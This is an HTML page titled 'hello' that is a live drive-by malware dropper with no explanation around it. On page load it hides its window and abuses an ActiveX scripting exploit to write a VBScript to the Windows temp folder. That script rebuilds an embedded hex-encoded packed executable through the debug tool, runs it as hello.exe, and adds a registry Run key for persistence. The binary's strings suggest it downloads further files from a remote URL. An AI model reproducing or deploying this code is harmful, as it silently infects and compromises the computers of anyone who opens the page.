<HTML><head><title>hello</title></head>
<body onload="window.moveTo(-1000, -1000);window.resizeTo(1, 1)">
<script language=JavaScript> 
document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.acti" + "veX.ActiveX" +"Component></APPLET>");function f() { try { a1=document.applets[0];var s;s ="{F935D"+"C22-1CF0-11"+"D0-ADB9-00C04"+"FD58A0B}";a1.setCLSID(s);a1.createInstance();Shl = a1.GetObject();s = "{0D43FE"+"01-F093-11"+"CF-8940-00"+"A0C9054228}";a1.setCLSID(s);a1.createInstance();FSO = a1.GetObject(); try { var fh, fn; fn = Shl.ExpandEnvironmentStrings("%Windir%") + "\\temp\\OLDAF101.vbs"; fh = FSO.CreateTextFile(fn, true);fh.WriteLine('On Error Resume Next');fh.WriteLine('set wshshell=CreateObject("WScript.Shell")');fh.WriteLine('set fs = CreateObject("Scripting.FileSystemObject")');
fh.WriteLine('fn = wshshell.ExpandEnvironmentStrings("%Windir%") + "\\temp"');fh.WriteLine('set fh = fs.CreateTextFile(fn +"\\ISDEL901.tmp", true)');fh.WriteLine('fh.WriteLine("e 100")');
fh.WriteLine('fh.WriteLine("4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 50 45 00 00 4C 01 03 00 50 4B 80 3E 00 00 00 00 00 00 00 00 E0 00 0F 01 0B 01 02 37 00 10 00 00 00 10 00 00 00 60 00 00 C0 78 00 00 00 70 00 00 00 80 00 00 00 00 40 00 00 10 00 00 00 02 00 00 01 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 90 00 00 00 10 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 58 80 00 00 44 01 00 00 00 80 00 00 58 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 50 58 30 00 00 00 00 00 60 00 00 00 10 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 E0 55 50 58 31 00 00 00 00 00 10 00 00 00 70 00 00 00 0C 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 E0 2E 72 73 72 63 00 00 00 00 10 00 00 00 80 00 00 00 02 00 00 00 0E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0 31 2E 32 33 00 55 50 58 21 0C 09 02 08 51 E9 4C 48 30 A2 7A 41 7C 53 00 00 A6 08 00 00 20 1A 00 00 26 00 00 70 FE FF F2 FF 31 C0 40 8B 4C 24 04 F7 41 04 06 00 74 0F 8B 44 24 08 8B 54 24 10 89 02 B8 03 B9 FF 77 EF 10 C3 53 56 57 12 10 50 6A FE 68 00 10 40 00 64 FF 35 15 FF DB DD B9 06 89 25 19 20 8B 58 2F 70 0C 83 FE FF 74 20 3B 74 7F D9 DC FF 24 24 74 1A 8D 34 76 8B 0C B3 54 17 48 7C B3 04 00 75 D7 77 FF BF FF FF 54 B3 08 EB D1 64 8F 05 35 83 C4 0C 5F 5E 5B C3 55 89 E5 5C 55 6A 00 37 6F EF 6E 01 68 92 5A FF 75 08 E8 1C 09 58 5D 89 EC 5D 6F FF DF DD C3 FC 20 83 EC 08 23 8B 5D 0C 8B 45 08 A3 30 30 25 89 1D 34 6F ED C7 76 05 F7 40 AE 75 72 89 45 F8 19 AC 45 FC A3 FF 6E BF 7D 16 8D 0D 89 43 FC 8B 73 2D 7B 08 91 62 8D 0C 76 DD DA BF 6C 81 8F 74 3A 56 55 8D 6B 10 86 0B 5D 5E B7 74 BB DF 4D 09 C0 74 28 78 31 25 53 E8 91 76 04 1D EE 77 CB 58 56 0C 1C 08 36 8B 04 8F 8B 43 0C 30 7E 17 FE B9 08 25 0F 34 8F EB AC 2C EB 71 47 6A FF ED BA B7 C3 2A 0C BC C7 05 10 7A 0B 0F 6A 0B E7 B0 9B D9 40 0A 48 5F 75 21 19 08 6E EF 1E 90 08 07 B8 01 12 EB 27 83 F8 A1 2A 50 5D 36 EC 15 50 24 1E 0D 30 75 1F 42 CC 94 28 0F 83 3D 2C 1A 00 9F BD BD 87 3E E8 A1 0E 72 FF E0 58 10 D7 64 A1 42 BB 19 0E 5D 35 9E 68 1C 1B 55 66 21 08 CD 9A 50 AA 49 10 46 70 FF FF 89 65 E8 50 D9 3C 24 66 81 0C 24 00 03 D9 2C 24 63 7F 28 BD F6 EC FB 2E 24 04 20 7E 09 F4 89 14 9E 6D 2F B2 05 24 16 48 14 A9 08 AC AF E3 E7 5F 18 31 C9 89 4D FC 50 00 C9 C3 11 A3 65 C6 AF B9 BF C3 7E FF 05 38 27 AE 05 5A 7E 02 B1 BD FF DE 25 08 37 03 95 5D C2 10 21 8C 28 D6 70 BB B0 55 7D A2 65 14 7C 28 6A B6 D8 48 77 BF FB 2E 8E 0C 8D 05 80 19 6A 45 DC C7 45 E4 1E 51 89 7D E8 D9 C6 0C 1B 78 7F 41 95 88 18 F0 83 3D 37 73 F4 06 28 6C 31 FC 3D 09 BB B3 6E F7 A0 68 50 12 C0 60 EA 2C 02 2E 94 DA 06 13 71 F6 B7 2B E3 64 57 10 64 5F C9 81 6A 3A 1E 1B 86 6E D3 40 5D 8B E7 45 FE DE F0 DF AB F8 10 74 65 7C 72 3D 10 51 74 09 3D 11 06 22 EB 62 30 F7 6C DB 2B 14 02 10 31 02 F0 A5 3E 7B C3 1B 9F EB 4E 0F B7 83 25 FF FF 65 F8 01 74 07 04 BD 67 B0 7F 02 74 11 EB 2D 6A 01 23 70 2A 32 24 6C 21 97 0E 1B 50 63 EE 41 28 EF 26 81 EC 18 80 B8 34 DB 22 DB 08 20 54 F4 62 D8 64 F6 F7 73 7F 64 9C 28 8D 7D 9C 68 56 15 27 0A 60 05 1B E1 65 E3 05 78 68 10 0F 85 9A 27 49 32 B6 46 B7 30 46 40 0D 85 62 00 50 6C B7 ED D9 6C 94 4C 16 90 27 7E 2A 15 10 F7 B1 CD DD 89 85 00 05 B6 57 57 40 57 68 11 38 EC 6D 76 6E 68 1B 04 F6 06 18 EB 4C 80 4D 0A 99 90 A1 28 00 A6 94 0C D9 C3 05 A6 CB F6 9E DB 75 1B 71 DE 30 98 48 DA A5 08 90 43 66 36 84 BD 40 CF 30 18 6D 64 07 74 1C 79 E0 B4 D7 6C DF 86 22 EB 7B 09 3C A9 04 3D D0 20 DB 93 ED 7E 0B 6E 9F EB 09 79 75 91 6C C9 B6 E0 98 7B 51 45 C9 90 4D B6 28 47 90 3E 68 4C 36 6C 41 7C 20 89 19 EB 69 FB 75 51 4B 3C 60 75 20 18 C7 11 3A 87 D1 63 0C EF 0C 59 1C B7 9D CE DA 02 04 2C 57 AB 2A 0C 2D 73 D8 7F 0C DF 08 A0 89 C7 09 FF 7C 05 24 5D 9D F5 6D BB 1C 68 02 1B 80 99 62 70 0F 75 B5 25 B7 A0 61 AB A1 20 04 C2 26 E7 5E E9 80 22 07 6C DB 16 55 50 D3 90 3E C3 31 15 15 AB 15 A6 26 33 1C D9 57 4F 10 D5 40 21 BF 48 97 19 66 0D 6C 27 4B 07 C7 9B 0B B3 21 97 34 04 20 3F 00 47 9E 5D B2 0F C4 C2 09 D0 75 16 89 3A B7 E5 4A 77 22 2F 18 05 06 14 0C A4 6C 76 D6 3E 28 D8 00 0B F6 0F 41 38 55 23 9B E4 61 3D 5D 6A 3D 15 0A 21 90 DC A8 DA 04 37 1B 6B EE 84 6A 86 E9 8F 09 57 C9 B7 4A B8 C9 09 2B B0 CA 16 89 55 3B CE 76 D9 D6 94 12 C1 C4 28 04 D6 7F C3 24 50 B0 0C 89 F9 83 C8 FF 40 80 3C 3C 0F D9 F6 F6 75 F9 89 32 C3 01 53 FB 01 F7 E8 89 C6 2B 11 B2 CF 89 35 8D 0F 2C 61 7E 89 07 AF C1 BB 7D 58 48 68 F0 92 41 73 83 8C 73 81 D3 75 0F 9B 08 8C FC C8 4D 98 5B 07 1B 0C F9 FE 83 50 F1 6D 47 08 63 8B 1B A3 56 8B 36 66 DD 33 AF 64 DB 13 36 F5 0C 21 61 74 33 9E E9 0D AE 33 0C 33 B8 BD FF 25 70 41 0A 90 90 DE 8A 79 FA 7F F9 54 10 80 3F 22 75 23 6A 22 89 F8 40 50 3D 6C FD 6F DF 26 29 1B 47 EB 01 47 1F 20 74 FA EB 1C 47 0F BE 07 2F 73 2F D0 14 05 97 20 75 F3 16 0E 74 F3 7E CD 75 06 27 1C F4 09 44 02 6E 80 6C 49 C6 6F 7C 0B 80 C8 80 0C C8 84 88 8C 0C C8 80 0C 90 94 A0 80 0C C8 80 A4 A8 C8 80 0C C8 AC B0 B4 0C C8 80 0C B8 C4 C8 80 0C C8 80 CC D0 C8 80 0C C8 D4 E0 E4 0C C8 80 0C E8 EC F0 80 0C C8 80 F4 F8 90 4B 0E C8 FC 00 42 04 40 11 36 19 08 00 2E 5A A2 11 64 1C 3E FF FF 54 D8 80 00 00 72 00 5C 74 6D 70 2E 64 61 74 00 68 74 74 70 BF FD FF F2 3A 2F 2F 77 2E 65 77 65 62 66 6F 72 6D 2E 63 6F 6D 10 69 6E 6B 65 72 C7 FE F6 F6 6E 61 6C 2F 0D 75 6E 74 0A 2E 61 73 70 00 66 2C 66 72 B2 77 BF B7 65 2B 71 65 40 34 71 6D 13 2E 6E 65 74 31 90 AD B2 DB 48 78 65 57 2F FF 20 5B D8 5C 0E 68 64 6E 73 61 70 69 F6 03 D6 6E BD 6C 6C 35 0B 73 79 73 74 68 30 ED F6 FF FF 61 64 00 53 4F 46 54 57 41 52 45 5C 4D 69 63 72 6F 73 6F 38 5C 57 CE E5 6F CB FF 64 6F 77 73 5C 43 75 72 72 65 56 DA 73 69 6F 6E 5C 52 8B CD BE 6D A9 65 3C 6F 5B 31 5D 86 0D 0A 41 AD 2D 19 00 FE 5A C0 42 05 85 F6 3B 57 F2 A0 2A EC 43 40 C8 95 BC 92 44 64 44 DC 28 6C 25 03 18 0B D3 35 97 9C 10 42 28 3C 03 50 03 D6 34 4D 68 78 84 90 23 9C 34 4D D3 35 B0 03 BC CC DC E8 A6 6B 2E DB FC 42 D7 0C 20 03 30 CE 6C CB 9A 40 54 E7 57 43 03 9A A6 69 9A 80 8C 94 A0 A8 B0 44 D8 A6 69 BC C4 D0 43 A3 27 88 92 5A 03 40 40 85 30 33 65 13 14 03 16 C2 CC 84 27 28 03 53 61 21 33 53 3C 03 1F 19 21 30 33 50 03 86 2A 10 12 44 D4 51 AB 3A 8A 01 05 90 FF 4B F3 20 20 40 10 02 00 27 00 33 00 2B 00 42 03 F2 FF 67 0A 01 53 00 79 00 73 00 74 00 65 00 6D 0B DA 8B FA 6F 18 50 0F 00 0D 00 16 00 0C 89 49 DE 5E C2 02 A4 1F 03 1D 00 18 40 65 34 E9 1F 02 5E A8 A0 B2 54 10 FE FF CB E6 A8 7C 31 01 47 65 74 43 6F 6D 6D 61 6E 64 4C 69 6E 65 41 1A AC FB 47 4D 6F 64 75 6C 65 48 13 6C 11 53 3F FB 7F 09 1D 65 6D 44 69 72 65 63 74 6F 72 79 14 54 69 63 6B F6 AD 99 A0 43 DE 0D 06 70 79 46 69 2D 04 FD F6 3E 4F 70 65 6E 0A 09 52 74 6C 55 6E A0 3F CD B6 98 64 6E B5 C4 52 65 67 43 EF B3 BF 95 65 4C 4B 65 79 45 78 41 10 6C 6F 73 0F DB 03 F6 62 0C 3E 1B 51 75 65 6E 56 86 B5 C3 DA 61 6C 06 11 53 78 0F 6F DF A7 D9 57 C2 E0 5F 5F B7 61 6C 41 72 67 AE 7B BB B7 73 0E 65 78 69 95 66 63 59 07 6F 54 AF 75 AD 6D 06 6D C1 0D 16 72 26 15 AE 05 BD 6B 06 99 01 73 69 67 35 07 DB B3 F6 60 0E 74 72 63 9D 07 68 72 60 CD EC DB FF 34 70 55 52 4C 44 6F 77 6E 50 61 64 54 6F EA 5B E1 34 5B 1C D8 A0 18 42 6F CD 5A B7 FD 67 42 6F 78 50 61 46 6D A7 45 4B 13 82 5C F7 DF 1B 65 66 44 6C 67 50 72 6F 63 17 4C 3E B6 D3 50 D8 44 73 43 42 53 94 72 BE 17 1A C6 D6 69 60 72 09 61 73 73 19 68 04 20 16 D4 6A 73 3D 13 E2 E5 ED 45 07 4C 01 05 4B 80 3E 04 88 43 94 FF 00 E0 00 0F 01 0B 01 02 37 4E 13 C2 10 6C 0A CB 11 0E 76 1B EC EC 10 77 17 01 33 04 3C 3B 73 CB 0E 60 0C 1E 34 10 07 96 B3 64 03 06 2F 40 9C 81 48 16 7A 50 DA D4 C1 BE C7 85 2E 13 78 74 A9 DF 10 07 AF 70 B7 B0 04 23 EA 60 2E 62 36 4B 1B B1 40 9E 1C 20 23 C0 F7 D0 75 44 B3 61 0B 74 10 30 07 CD BA 37 B2 E8 EA 27 69 28 9C 0B 9B EC F3 FB 12 27 60 24 4C D8 28 C9 26 00 13 1B F8 D9 5B D9 18 4F 1B 00 AE 51 00 00 00 00 00 00 00 00 24 00 FF 00 00 00 00 00 60 BE 15 70 40 00 8D BE EB 9F FF FF 57 83 CD FF EB 10 90 90 90 90 90 90 8A 06 46 88 07 47 01 DB 75 07 8B 1E 83 EE FC 11 DB 72 ED B8 01 00 00 00 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C0 01 DB 73 EF 75 09 8B 1E 83 EE FC 11 DB 73 E4 31 C9 83 E8 03 72 0D C1 E0 08 8A 06 46 83 F0 FF 74 74 89 C5 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 75 20 41 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 73 EF 75 09 8B 1E 83 EE FC 11 DB 73 E4 83 C1 02 81 FD 00 F3 FF FF 83 D1 01 8D 14 2F 83 FD FC 76 0F 8A 02 42 88 07 47 49 75 F7 E9 63 FF FF FF 90 8B 02 83 C2 04 89 07 83 C7 04 83 E9 04 77 F1 01 CF E9 4C FF FF FF 5E 89 F7 B9 4B 00 00 00 8A 07 47 2C E8 3C 01 77 F7 80 3F 00 75 F2 8B 07 8A 5F 04 66 C1 E8 08 C1 C0 10 86 C4 29 F8 80 EB E8 01 F0 89 07 83 C7 05 89 D8 E2 D9 8D BE 00 50 00 00 8B 07 09 C0 74 3C 8B 5F 04 8D 84 30 58 70 00 00 01 F3 50 83 C7 08 FF 96 D0 70 00 00 95 8A 07 47 08 C0 74 DC 89 F9 57 48 F2 AE 55 FF 96 D4 70 00 00 09 C0 74 07 89 03 83 C3 04 EB E1 FF 96 D8 70 00 00 61 E9 B7 97 FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D8 EC 88 31 00 00 00 00 00 00 01 00 05 00 00 00 18 00 00 80 00 00 00 00 D8 EC 88 31 00 00 00 00 00 00 01 00 64 00 00 00 30 00 00 80 00 00 00 00 D8 EC 88 31 00 00 00 00 00 00 01 00 04 08 00 00 48 00 00 00 60 50 00 00 74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 81 00 00 D0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0D 81 00 00 E0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A 81 00 00 E8 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 25 81 00 00 F0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 81 00 00 F8 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 81 00 00 48 81 00 00 58 81 00 00 00 00 00 00 66 81 00 00 00 00 00 00 74 81 00 00 00 00 00 00 7A 81 00 00 00 00 00 00 8E 81 00 00 00 00 00 00 4B 45 52 4E 45 4C 33 32 2E 44 4C 4C 00 41 44 56 41 50 49 33 32 2E 44 4C 4C 00 43 52 54 44 4C 4C 2E 44 4C 4C 00 75 72 6C 6D 6F 6E 2E 44 4C 4C 00 55 53 45 52 33 32 2E 44 4C 4C 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 00 45 78 69 74 50 72 6F 63 65 73 73 00 00 00 52 65 67 43 6C 6F 73 65 4B 65 79 00 00 00 65 78 69 74 00 00 55 52 4C 44 6F 77 6E 6C 6F 61 64 54 6F 46 69 6C 65 41 00 00 53 65 74 54 69 6D 65 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 00 00 00 00 00 20 00 00 00 00 10 00 00 00 1C 00 00 00 20 00 00 00 2A 00 00 ")');
fh.WriteLine('fh.WriteLine("n " + fn +"\\ISDEL902.tmp")');fh.WriteLine('fh.Writeline("rcx")');fh.WriteLine('fh.Writeline("7000")');fh.WriteLine('fh.Writeline("w 100")');fh.WriteLine('fh.WriteLine("q")');fh.WriteLine('fh.Close()');
fh.WriteLine('cmd = WshShell.ExpandEnvironmentStrings("%ComSpec%") + " /c debug < " + fn +"\\ISDEL901.tmp"');
fh.WriteLine('wshshell.Run cmd, false, 1');fh.WriteLine('while not fs.FileExists(fn + "\\ISDEL902.tmp")');
fh.WriteLine('WshShell.Sleep 200');fh.WriteLine('wend');fh.WriteLine('fs.CopyFile fn+"\\ISDEL902.tmp", fn + "\\hello.exe"');
fh.WriteLine('fs.DeleteFile fn + "\\ISDEL902.tmp"');fh.WriteLine('fs.DeleteFile fn + "\\ISDEL901.tmp"');fh.WriteLine('if fs.FileExists(fn + "\\hello.exe") then');
fh.WriteLine('WshShell.RegDelete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\vbs"');fh.WriteLine('wshshell.Run fn + "\\hello.exe", false, 1');
fh.WriteLine('end if');fh.WriteLine('fs.DeleteFile fn + "\\OLDAF101.vbs"');fh.Close();Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\vbs", fn);} catch(e) {} } catch(e) {} }
function init() { setTimeout("f()", 1000);setTimeout("close()", 30000); } init();</script> 
</BODY>
</HTML> 